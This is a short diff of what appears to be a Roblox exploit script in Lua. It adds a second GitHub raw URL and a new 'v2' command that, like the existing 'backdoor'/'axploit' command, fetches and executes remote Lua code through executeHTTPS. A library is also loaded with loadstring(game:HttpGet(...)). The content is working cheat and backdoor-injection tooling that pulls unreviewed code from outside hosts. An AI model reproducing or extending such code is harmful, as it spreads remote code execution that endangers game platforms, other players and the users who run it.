@@ -21,7 +21,7 @@ _G.Settings = {
 
 local COREGUI = game:GetService("CoreGui")
 -- (62x) - final: 100 (JK)
-local version = "2.4.7" -- reverted version
+local version = "2.4.8" -- reverted version
 
 -- _G.Settings.banwaves
 -- _G.Settings.FreezeFling
@@ -440,7 +440,8 @@ local Vortex = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsk
 local Blur = Instance.new("BlurEffect", Lighting)
 Blur.Size = 0 --12
 local UrlScript = {
-	"https://raw.githubusercontent.com/Sidhsksjsjsh/SHHHHIIIITTTT/main/.lua"
+	"https://raw.githubusercontent.com/Sidhsksjsjsh/SHHHHIIIITTTT/main/.lua",
+	"https://raw.githubusercontent.com/Sidhsksjsjsh/asshole/main/.lua"
 }
 --[[
 function LyricsMusic(musicname)
@@ -9655,6 +9656,12 @@ if cmd == "backdoor" or cmd == "axploit" then
 Vortex:CheckError(function()
 	notify("Injecting...","pls wait..")
         executeHTTPS(UrlScript[1])
+end)
+end
+if cmd == "v2" then
+Vortex:CheckError(function()
+	notify("Injecting...","pls wait..")
+        executeHTTPS(UrlScript[2])
 end)
 end
 --[[
